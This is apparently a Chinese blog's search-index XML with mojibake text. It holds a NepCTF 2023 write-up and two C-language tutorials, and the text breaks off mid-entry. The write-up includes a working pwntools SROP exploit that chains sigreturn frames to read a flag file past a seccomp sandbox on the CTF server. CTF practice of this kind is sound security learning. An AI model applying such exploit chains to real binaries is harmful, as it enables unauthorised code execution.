<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Nepæ‘¸é±¼è®°</title>
      <link href="/2023/11/27/NepCTF%202023/"/>
      <url>/2023/11/27/NepCTF%202023/</url>
      
        <content type="html"><![CDATA[<h2 id="NepCTF-2023"><a href="#NepCTF-2023" class="headerlink" title="NepCTF 2023"></a>NepCTF 2023</h2><p>ä¸ºä»€ä¹ˆå¼€èµ›ä¸¤åˆ†é’Ÿé€‰æ‹©ä¸æ‰“äº†ï¼Ÿ<br>ç­”æ¡ˆå¾ˆç®€å•ï¼š<del>ç­¾åˆ°é¢˜æ ¼å¼æ‰“é”™äº†â€¦è¿è¥å§å§æ²¡å›æˆ‘â€¦48hâ€¦</del><br>ç‚®ç°pwnä¸ä¼šåšï¼ï¼ï¼ï¼ˆå…¶å®å¯ä»¥åšmiscï¼‰</p><h3 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h3><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>é¢˜ç›®æç¤ºflagåœ¨ç¯å¢ƒå˜é‡ä¸­ <del>å¼€å§‹STFW</del><br><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">https://blog.csdn.net/aspnet_lyc/article/details/20548767</a></p><pre><code class="c">#include &lt;stdio.h&gt; int main(int argc, char** argv, char** arge)&#123;    while(*arge)    &#123;        printf(&quot;%s\n&quot;, *arge++);    &#125;    return 0;&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814162812545.png" alt="image-20230814162812545"></p><h4 id="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"><a href="#ä¸AIå…±èˆçš„å“ˆå¤«æ›¼" class="headerlink" title="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"></a>ä¸AIå…±èˆçš„å“ˆå¤«æ›¼</h4><p>æ±‚åŠ©chatå› ä¸ºä¸ä¼šç”¨<del>copilot</del></p><h4 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h4><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814174205317.png" alt="image-20230814174205317"></p><p>äº”å­æ£‹ ä¸ä¼šå†™è„šæœ¬å¹²ä¸‹å§hhï¼ˆæ±‚åŠ©chatä¹Ÿä¸æ˜¯ä¸è¡Œï¼‰</p><pre><code class="python">from pwn import *import randomr = remote(&#39;nepctf.1cepeak.cn&#39;, 31762)def getboard():    board = []    for i in range(15):        data = r.recvline().decode()[3:].replace(&#39;[&#39;, &#39; &#39;).replace(&#39;]&#39;, &#39; &#39;).strip()        data = data.split(&#39; &#39;)        board.append(data)    return boardtable = &#39;abcdefghijklmno&#39;while True:    r.recvline()    r.recvline()    r.recvline()    r.recvline()    res = r.recvline().decode()    if(int(res.split(&#39;:&#39;)[0]) &gt;= 38):        r.interactive()    print(res)    r.recvline()    r.recvline()    board = getboard()    random_x = random.randint(0, 14)    random_y = random.randint(0, 14)    while board[random_y][random_x] != &#39;.&#39;:        random_x = random.randint(0, 14)        random_y = random.randint(0, 14)    pos = table[random_x] + table[random_y]    r.recvline()    r.sendline(pos)    r.recvline()</code></pre><h4 id="é™Œç”Ÿçš„è¯­è¨€"><a href="#é™Œç”Ÿçš„è¯­è¨€" class="headerlink" title="é™Œç”Ÿçš„è¯­è¨€"></a>é™Œç”Ÿçš„è¯­è¨€</h4><p>  æ ¹æ®æç¤ºAåŒå­¦ å¼€å§‹bing ç»“æœ ç«Ÿç„¶ çœ‹è¿‡ ï¼ˆæˆ‘æœ‰ç½ªï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814195648669.png" alt="image-20230814195648669"></p><p>â€‹    </p><h3 id="PWNå¤ç°"><a href="#PWNå¤ç°" class="headerlink" title="PWNå¤ç°"></a>PWNå¤ç°</h3><p>  ä¸æ˜¯æˆ‘è¯´ æ˜¯çœŸä¸ä¼šä½†æ˜¯è·Ÿç€å¤ç°cve ä»ä¸­å­¦åˆ°äº†å¾ˆå¤š</p><h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><p>é¢˜ç›®æç¤ºclassic pwn</p><p>å…ˆseccomp-toolsæŸ¥çœ‹æ˜¯å¦æœ‰æ²™ç›’<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816102445148.png" alt="image-20230816102445148"></p><p>really existï¼<br>æœ‰æ²™ç›’ï¼Œåªèƒ½ä½¿ç”¨openï¼Œreadï¼Œwriteå‡½æ•°. goto 0009ä¸­0009æ˜¯return ALLOWè¯´æ˜å…è®¸æ‰§è¡Œ.<br>è‹¥ä¸ºgoto 00010åˆ™è¢«ç¦ç”¨. </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816104100112.png" alt="image-20230816104100112"></p><p>â€‹    æ³¨æ„æ˜¯call syscallå‡½æ•°è€Œä¸æ˜¯ç›´æ¥syscall æ‰€ä»¥å¯„å­˜å™¨ä¼šæœ‰åç§»</p><pre><code class="python">from pwn import *io = remote(&quot;nepctf.1cepeak.cn&quot;,30307)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level = &#39;debug&#39;context.arch = &quot;amd64&quot;io.recvuntil(&quot;welcome to NepCTF2023!&quot;)pop_rdi = 0x0000000000400813syscall = 0x4005B0bss_addr = elf.bss(0x500)read_function = SigreturnFrame()read_function.rdi = 0read_function.rsi = 0read_function.rdx = bss_addr-0x8read_function.rcx = 0x500read_function.rip = syscallread_function.rsp = bss_addrpayload = cyclic(0x38)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(read_function)io.send(payload)open = SigreturnFrame()open.rdi = 2open.rsi = bss_addr-0x8open.rdx = 0open.rcx = 0open.rip = syscallopen.rsp = bss_addr + 0x110read_function = SigreturnFrame()read_function.rdi = 0read_function.rsi = 3read_function.rdx = bss_addr - 0x200read_function.rcx = 0x100read_function.rip = syscallread_function.rsp = bss_addr + 0x220write_funtion = SigreturnFrame()write_funtion.rdi = 1write_funtion.rsi = 1write_funtion.rdx = bss_addr - 0x200write_funtion.rcx = 0x100write_funtion.rip = syscallwrite_funtion.rsp = bss_addr+0x30payload = b&#39;./flag\x00\x00&#39;+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(open)payload = payload.ljust(0x108,b&#39;\x00&#39;)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(read_function)payload = payload.ljust(0x208,b&#39;\x00&#39;)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(write_funtion)io.send(payload)io.recv()io.recv()</code></pre><p>Nepctf{SROP_IT_IS_EAsY_6ee3e57b-3982-4924-844a-d362c3006b20}</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜ç›®è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cæ¢ç´¢ç¢ç‰‡â€”â€”å…³é”®å­—staticä½œç”¨</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ç®€è¿°"><a href="#ä¸€ã€ç®€è¿°" class="headerlink" title="ä¸€ã€ç®€è¿°"></a>ä¸€ã€ç®€è¿°</h2><p>staticæ„è¯‘æ˜¯é™æ€çš„ï¼Œè€Œä½œä¸ºCè¯­è¨€ä¸­å¸¸è§çš„å…³é”®å­—ä¹‹ä¸€ï¼Œå®ƒçš„ç”¨æ³•ä¹Ÿè´´åˆ‡â€œé™æ€â€è¿™ä¸€å«ä¹‰ã€‚</p><h2 id="äºŒã€ç”¨æ³•"><a href="#äºŒã€ç”¨æ³•" class="headerlink" title="äºŒã€ç”¨æ³•"></a>äºŒã€ç”¨æ³•</h2><ol><li><ul><li><strong>ä¿®é¥°å±€éƒ¨å˜é‡</strong></li></ul></li></ol><p>ä¸‹ä¸ºstaticæ˜¯å¦ä¿®é¥°å±€éƒ¨å˜é‡å¯¹ç¨‹åºè¿è¡Œç»“æœå½±å“çš„å¯¹æ¯”ã€‚</p><pre><code class="c">#include&lt;stdio.h&gt;void play()&#123;    int a = 6;    a++;    printf(&quot;%d &quot;, a);&#125;int main()&#123;    int i = 0;    while (i &lt; 5)    &#123;        play();        i++;    &#125;    return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cb3a80ccb2c62eeceb98bffabadbb269.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>æ­¤ä¸ºä¸Šå›¾staticæœªä¿®é¥°å±€éƒ¨å˜é‡çš„è¿è¡Œç»“æœ</p><pre><code class="c">#include&lt;stdio.h&gt;void play()&#123;    static int a = 6;    a++;    printf(&quot;%d &quot;, a);&#125;int main()&#123;    int i = 0;    while (i &lt; 5)    &#123;        play();        i++;    &#125;    return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4b420992488352dce723db40cb016674.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>æ­¤ä¸ºstaticä¿®é¥°å±€éƒ¨å˜é‡çš„è¿è¡Œç»“æœ</p><p>ç”±ä¸Šè¿°çš„å¯¹æ¯”è§‚å¯Ÿå¯å¾—ï¼šstaticä¿®é¥°å±€éƒ¨å˜é‡æ—¶æ”¹å˜äº†è¢«ä¿®é¥°ï¼ˆé™æ€å±€éƒ¨ï¼‰å˜é‡çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><p>æˆ‘ä»¬çŸ¥é“å±€éƒ¨å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯è¿›ä½œç”¨åŸŸå¼€å§‹ï¼Œå‡ºä½œç”¨åŸŸç»“æŸï¼Œè€Œå…¶ä½œç”¨åŸŸæ˜¯å˜é‡æ‰€åœ¨çš„å±€éƒ¨èŒƒå›´ã€‚æ·±å…¥å‰–ææ¥è¯´ï¼Œstaticä¿®é¥°å±€éƒ¨å˜é‡æ—¶æ”¹å˜äº†å˜é‡çš„å­˜å‚¨ç±»å‹ã€‚å°†æœ¬æ¥å­˜å‚¨åœ¨æ ˆåŒºçš„å±€éƒ¨å˜é‡å­˜æ”¾åœ¨äº†é™æ€åŒºã€‚å­˜å‚¨ç±»å‹çš„æ”¹å˜ä½¿å¾—å…¶ç”Ÿå‘½å‘¨æœŸå˜é•¿ï¼Œä½†å¹¶ä¸å½±å“å˜é‡çš„ä½œç”¨åŸŸã€‚</p><h4 id="2-ä¿®é¥°å…¨å±€å˜é‡"><a href="#2-ä¿®é¥°å…¨å±€å˜é‡" class="headerlink" title="2.ä¿®é¥°å…¨å±€å˜é‡"></a>2.ä¿®é¥°å…¨å±€å˜é‡</h4><p>ä¸‹ä¸ºstaticæ˜¯å¦ä¿®é¥°å…¨å±€å˜é‡å¯¹ç¨‹åºè¿è¡Œç»“æœå½±å“çš„å¯¹æ¯”ã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8b3d989de9c69ddbf491862d2066dc0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><blockquote><p>ç”¨externå£°æ˜å¤–éƒ¨ç¬¦å·ä½¿å¾—åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¸­å¯ä»¥è¾¾åˆ°â€œä¸€æ¬¡å®šä¹‰ï¼Œå¤šæ¬¡å£°æ˜â€çš„æ•ˆæœã€‚<br> æ³¨æ„ï¼šexternåªèƒ½ç”¨æ¥å£°æ˜å…¨å±€å˜é‡ï¼</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/1215a0c458837f0883569331440183c5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>å½“ç”¨staticä¿®é¥°å…¨å±€å˜é‡åï¼Œç¨‹åºæŠ¥é”™æ— æ³•è¿è¡Œã€‚</p><p>å·²çŸ¥å…¨å±€å˜é‡å…·æœ‰å¤–éƒ¨é“¾æ¥å±æ€§ï¼Œä¸Šå›¾å¯¹æ¯”åˆ†æå¾—ï¼šstaticä¿®é¥°å…¨å±€å˜é‡ä¹‹åå°†å…¶ï¼ˆé™æ€å…¨å±€å˜é‡ï¼‰å¤–éƒ¨é“¾æ¥å±æ€§å˜æˆäº†å†…éƒ¨é“¾æ¥å±æ€§ã€‚æ­¤æ—¶çš„å…¨å±€å˜é‡åªèƒ½åœ¨è‡ªå·±æ‰€åœ¨çš„.Cæ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œå¯¹å…¶ä»–æ–‡ä»¶æ— æ³•é“¾æ¥ä½¿ç”¨ã€‚å³staticå¯¹å…¨å±€å˜é‡è¿›è¡Œä¿®é¥°æ”¹å˜äº†å…¶ä½œç”¨åŸŸçš„èŒƒå›´ï¼Œç”±åŸæ¥çš„æ•´ä¸ªå·¥ç¨‹å¯è§å˜ä¸ºæœ¬æºæ–‡ä»¶å¯è§ã€‚</p><h4 id="3-ä¿®é¥°å‡½æ•°"><a href="#3-ä¿®é¥°å‡½æ•°" class="headerlink" title="3.ä¿®é¥°å‡½æ•°"></a>3.ä¿®é¥°å‡½æ•°</h4><p>ä¸‹ä¸ºstaticæ˜¯å¦ä¿®é¥°å…¨å±€å˜é‡å¯¹ç¨‹åºè¿è¡Œç»“æœå½±å“çš„å¯¹æ¯”ã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a2a0dd86fadcd5cc30ec0d88437f5fae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e00d77cdfa029bdbe513811525802465.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>æ­¤ä¸ºä¸ºè¢«staticä¿®é¥°æ—¶ç¨‹åºè¿è¡Œç»“æœ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/436508929245bdfd15f062208af6e666.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>ç¨‹åºæŠ¥é”™ æ— æ³•è¿è¡Œ</p><p>å‡½æ•°ä¹Ÿå…·æœ‰å¤–éƒ¨é“¾æ¥å±æ€§ï¼Œç”±ä¸Šåˆ†æå¯å¾—ç›¸åŒç»“è®ºï¼šstaticä¿®é¥°å‡½æ•°ï¼ˆé™æ€å‡½æ•°ï¼‰åå°†å…¶å¤–éƒ¨é“¾æ¥å±æ€§å˜ä¸ºå†…éƒ¨é“¾æ¥å±æ€§ï¼Œæ— æ³•é“¾æ¥ä½¿ç”¨ï¼Œåªå¯åœ¨è‡ªå·±æ‰€åœ¨.cæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚</p><h4 id="ä¸‰ã€æ€»ç»“"><a href="#ä¸‰ã€æ€»ç»“" class="headerlink" title="ä¸‰ã€æ€»ç»“"></a>ä¸‰ã€æ€»ç»“</h4><p>staticä¿®é¥°å±€éƒ¨å˜é‡æ—¶å°†å…¶ç”Ÿå‘½å‘¨æœŸå»¶é•¿ä½†ä½œç”¨åŸŸæœªå‘ç”Ÿæ”¹å˜ã€‚</p><p>staticä¿®é¥°å…¨å±€å˜é‡å’Œå‡½æ•°æ—¶å°†å…¶å¤–éƒ¨é“¾æ¥å±æ€§å˜ä¸ºå†…éƒ¨é“¾æ¥å±æ€§ï¼Œä½¿å…¶åªèƒ½åœ¨æ‰€åœ¨æ–‡ä»¶ä¸­ä½¿ç”¨ã€‚</p><h4 id="å››ã€è¡¥å……"><a href="#å››ã€è¡¥å……" class="headerlink" title="å››ã€è¡¥å……"></a>å››ã€è¡¥å……</h4><p>ä»¥ä¸‹å†…å®¹åªä¸ºç®€å•æåˆ°ï¼Œåç»­å­¦ä¹ è¿‡ç¨‹ä¸­ä¼šä¸“é—¨åšåˆ†äº«æ¢è®¨ã€‚</p><h5 id="1-æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº"><a href="#1-æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº" class="headerlink" title="1.æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº"></a>1.æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº</h5><p><img src="https://img-blog.csdnimg.cn/img_convert/b90c659e4affce80d1838890434a951f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><h5 id="2-æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§"><a href="#2-æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§" class="headerlink" title="2.æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§"></a>2.æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§</h5><p>é“¾æ¥å±æ€§ï¼ˆlinkageï¼‰åˆ†ä¸ºä¸‰ç§â€”â€”å¤–éƒ¨ï¼ˆexternalï¼‰ã€å†…éƒ¨ï¼ˆinternalï¼‰ã€æ— ï¼ˆnoneï¼‰ã€‚</p><p>æ³¨æ„ï¼š*é“¾æ¥å±æ€§çš„æ”¹å˜ä¸ä¼šæ”¹å˜ä½œç”¨åŸŸã€‚</p><p>*é“¾æ¥å±æ€§æ„å‘³ç€èƒ½ä¸èƒ½è®¿é—®å˜é‡åŠèƒ½ä¸èƒ½åœ¨æ–‡ä»¶ä¸­å®šä¹‰åŒåå˜é‡æˆ–å‡½æ•°åã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cè¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cæ¢ç´¢ç¢ç‰‡â€”â€”æ“ä½œç¬¦</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>Cçš„æ¢ç´¢ç¢ç‰‡â€”â€”æ“ä½œç¬¦</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/2f25a996e53a0589036894fc5c92a086.gif" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><ol><li><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3></li></ol><p>ç®—æœ¯æ“ä½œç¬¦</p><p>ç§»ä½æ“ä½œç¬¦</p><p>ä½æ“ä½œç¬¦</p><p>èµ‹å€¼æ“ä½œç¬¦</p><p>å•ç›®æ“ä½œç¬¦</p><p>å…³ç³»æ“ä½œç¬¦</p><p>é€»è¾‘æ“ä½œç¬¦</p><p>æ¡ä»¶æ“ä½œç¬¦</p><p>é€—å·è¡¨è¾¾å¼</p><p>ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜</p><h4 id="ä¸€-ç®—æ•°æ“ä½œç¬¦"><a href="#ä¸€-ç®—æ•°æ“ä½œç¬¦" class="headerlink" title="ä¸€.ç®—æ•°æ“ä½œç¬¦"></a>ä¸€.ç®—æ•°æ“ä½œç¬¦</h4><pre><code class="plaintext">+  -  *  /  % </code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>+ã€-ã€*æ­¤ç±»æ•°å­¦ä¸­å¸¸è§çš„ç®—æ•°ç¬¦å·æˆ‘ä»¬å†ç†Ÿæ‚‰ä¸è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯&#x2F;ï¼ˆé™¤ï¼‰ï¼Œ%ï¼ˆå–ä½™ï¼‰ä¹‹é—´çš„åŒºåˆ«ã€‚</p><p>ä¾‹ï¼š</p><pre><code class="c">#include&lt;stdio,h&gt;int main()&#123;    int a = 10;    printf(&quot;%d&quot;,a/3);//ç»“æœä¸º3    printf(&quot;%d&quot;,a%3);//ç»“æœä¸º1    return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æ³¨æ„ï¼š1.é™¤%æ“ä½œç¬¦ä¹‹å¤–ã€‚å…¶ä»–å‡ ä¸ªæ“ä½œç¬¦å¯ä»¥ä½œç”¨äºæ•´æ•°å’Œæµ®ç‚¹æ•°ã€‚</p><p>2.&#x2F;æ“ä½œç¬¦è¿ç®—æ—¶è‹¥ä¸¤ä¸ªæ“ä½œæ•°ä¸­å«æµ®ç‚¹æ•°åˆ™æ‰§è¡Œæµ®ç‚¹æ•°é™¤æ³•ï¼ˆ%lfæ‰“å°ç»“æœï¼‰ï¼›è‹¥ä¸¤æ“ä½œæ•°éƒ½ä¸ºæ•´æ•°åˆ™æ‰§è¡Œæ•´æ•°é™¤æ³•ã€‚</p><p>3.%æ“ä½œç¬¦çš„ä¸¤ä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºæ•´æ•°ã€‚</p><h4 id="äºŒã€ç§»ä½æ“ä½œç¬¦"><a href="#äºŒã€ç§»ä½æ“ä½œç¬¦" class="headerlink" title="äºŒã€ç§»ä½æ“ä½œç¬¦"></a>äºŒã€ç§»ä½æ“ä½œç¬¦</h4><pre><code class="plaintext">&lt;&lt;  å·¦ç§»æ“ä½œç¬¦&gt;&gt;  å³ç§»æ“ä½œç¬¦æ³¨ï¼šç§»ä½æ“ä½œç¬¦çš„æ“ä½œæ•°åªèƒ½æ˜¯æ•´æ•°ã€‚</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><em>ç§»ä½æ“ä½œç¬¦ç§»åŠ¨çš„æ˜¯äºŒè¿›åˆ¶çš„ä½ï¼Œ</em>è€Œæ•´æ•°åœ¨å†…å­˜ä¸­ä»¥è¡¥ç çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå±å¹•ä¸Šåˆä»¥åŸç æ˜¾ç¤ºã€‚</p><p>è¡¥å……ï¼š</p><p><strong>åŸç </strong>ï¼šæŠŠä¸€ä¸ªæ•°æŒ‰æ­£è´Ÿç›´æ¥ç¿»è¯‘æˆäºŒè¿›åˆ¶ï¼›</p><p><strong>åç </strong>ï¼šå¯¹åŸç è¿›è¡ŒæŒ‰ä½å–ï¼ˆå³0å˜ä¸º1ï¼Œ1å˜ä¸º0ï¼‰åå¾—åˆ°åç ï¼›</p><p><strong>è¡¥ç </strong>ï¼šåç +1å¾—è¡¥ç ã€‚</p><p>å¯¹äºæ­£æ•´æ•°åŸç åç è¡¥ç ç›¸åŒï¼Œè´Ÿæ•´æ•°åˆ™éœ€è®¡ç®—ã€‚</p><p>è®¡ç®—æ–¹æ³•ï¼šåŸç ç¬¦å·ä½ï¼ˆäºŒè¿›åˆ¶è¡¨ç¤ºçš„æœ€é«˜ä¸€ä½ï¼Œæ˜¯0è¡¨ç¤ºä¸ºè´Ÿæ•°ï¼Œæ˜¯1è¡¨ç¤ºä¸ºæ­£æ•°ï¼‰ä¸å˜ï¼Œå…¶ä»–ä½æŒ‰ä½å–åå¾—åˆ°åç ï¼Œ+1å¾—åˆ°è¡¥ç ã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/577aafbe300b6819adb36ad9ca0b8713.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>ç§»ä½è§„åˆ™ï¼š</p><ol><li>å·¦ç§»æ“ä½œç¬¦ï¼šå·¦è¾¹æŠ›å¼ƒã€å³è¾¹è¡¥0ã€‚</li></ol><p><img src="https://img-blog.csdnimg.cn/img_convert/7dea2e4433fabdfafcc5e51f99be91f8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><ol><li>å³ç§»æ“ä½œç¬¦ï¼ˆç”±ç¼–è¯‘å™¨å†³å®šï¼‰ï¼š</li></ol><p>é€»è¾‘ç§»ä½</p><p>å·¦è¾¹ç”¨0å¡«å……ï¼Œå³è¾¹ä¸¢å¼ƒã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/97b52d3e735c5b8e80b4087060038946.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>ç®—æœ¯ç§»ä½</p><p>å·¦è¾¹ç”¨åŸè¯¥å€¼çš„ç¬¦å·ä½å¡«å……ï¼Œå³è¾¹ä¸¢å¼ƒã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c94a1583fad019f42f8fafa14d6897e5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>è­¦å‘Šâš ï¼š</p><p>å¯¹äºç§»ä½è¿ç®—ç¬¦ï¼Œä¸è¦ç§»åŠ¨è´Ÿæ•°ä½ï¼Œè¿™ä¸ªæ˜¯æ ‡å‡†æœªå®šä¹‰çš„ã€‚</p><h4 id="ä¸‰ã€ä½æ“ä½œç¬¦"><a href="#ä¸‰ã€ä½æ“ä½œç¬¦" class="headerlink" title="ä¸‰ã€ä½æ“ä½œç¬¦"></a>ä¸‰ã€ä½æ“ä½œç¬¦</h4><pre><code class="plaintext">&amp;//æŒ‰ä½ä¸|//æŒ‰ä½æˆ–^//æŒ‰ä½å¼‚æˆ–æ³¨ï¼šå®ƒä»¬çš„æ“ä½œæ•°å¿…é¡»ä¸ºæ•´æ•°ã€‚</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>å‡å¯¹äºŒè¿›åˆ¶è¿›è¡Œæ“ä½œã€‚</p><p>&amp;ï¼šæœ‰0ä¸º0ï¼Œå‡1ä¸º1ï¼›</p><p>|ï¼šæœ‰ 1ä¸º1ï¼Œå‡0ä¸º0ï¼›</p><p>^ï¼šç›¸åŒä¸º0ï¼Œç›¸å¼‚ä¸º1ï¼Œä¸”ä¿è¯ä¸ä¼šæ ˆæº¢å‡ºã€‚</p><p>å°tipï¼š</p><pre><code class="plaintext">a ^ a = 0;0 ^ a = 